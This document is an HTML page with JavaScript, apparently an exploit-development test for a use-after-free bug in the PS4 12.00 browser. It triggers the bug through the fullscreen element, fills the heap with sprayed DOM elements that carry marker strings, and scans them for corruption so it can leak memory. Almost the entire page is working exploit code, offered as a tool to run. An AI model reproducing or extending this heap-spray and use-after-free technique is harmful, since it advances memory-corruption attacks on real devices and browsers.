
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Bucket Scan (Real Leak Stage)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Bucket Scan (Real Corruption Detection)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];
function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 💣 HEAP PRIMING (ESSENCIAL)
// ==========================
function setupHeap(){
    let t = new Float64Array(8);
    t[0] = 0x1337;
    window.__priming = t;

    log("[*] heap primed (1 array)");
}

// ==========================
// FULLSCREEN
// ==========================
function setupFullscreen(){

    let fsTarget = document.createElement("div");

    fsTarget.innerHTML =
        "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM MONOTIPO
// ==========================
function preciseReclaim(size){

    log("[*] Reclaim size = "+size);

    let bucket = [];

    // churn inicial
    for(let i=0;i<1500;i++){
        let el=document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // spray controlado
    for(let i=0;i<size;i++){

        let el = document.createElement("div");

        el.innerHTML =
            "CTRL_"+i+"_41414141_42424242_43434343";

        document.body.appendChild(el);
        bucket.push(el);
    }

    return bucket;
}

// ==========================
// 🔬 SCAN REAL DO HEAP
// ==========================
function scanBucket(bucket){

    log("---- BUCKET SCAN ----");

    for(let i=0;i<bucket.length;i++){

        let el = bucket[i];

        try{
            let html = el.innerHTML;

            // esperado: CTRL_
            if(!html.includes("CTRL_")){

                log("[!!!] POSSIVEL CORRUPÇÃO EM INDEX " + i);
                log("[CORRUPTED] innerHTML = " + html);

                let preview = html.substring(0,100);
                log("[PREVIEW] " + preview);

                let codes = [];
                for(let j=0;j<preview.length;j++){
                    codes.push(preview.charCodeAt(j));
                }

                log("[RAW] " + codes.slice(0,50));

                return; // para no primeiro hit
            }

        }catch(e){

            log("[!!!] CRASH AO LER INDEX " + i);
            return;
        }
    }

    log("[SCAN] nenhum bucket corrompido detectado");
}

// ==========================
// TRIGGER
// ==========================
function trigger(fsTarget){

    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){}

    let sizes = [2000, 2500, 3000];

    sizes.forEach((size, idx)=>{

        setTimeout(()=>{

            let bucket = preciseReclaim(size);

            // 🔥 janela crítica → scan rápido
            setTimeout(()=>{
                scanBucket(bucket);
            }, 30);

        }, idx * 80);

    });

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },600);

    setTimeout(()=>location.reload(),800);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Iniciando teste");

    setupHeap();

    let fsTarget = setupFullscreen();

    window.onblur = function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget),3000);
    };
}

</script>

</body>
</html>
